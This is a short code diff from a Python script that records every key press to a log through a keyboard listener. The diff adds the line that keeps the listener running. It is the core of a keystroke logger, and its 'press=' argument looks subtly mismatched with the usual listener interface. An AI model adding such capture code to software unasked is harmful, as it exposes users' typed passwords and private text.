@@ -9,3 +9,4 @@ def press(key):
 	logging.info(str(key))
 	
 with Listener(press=press) as listener:
+	listener.join()
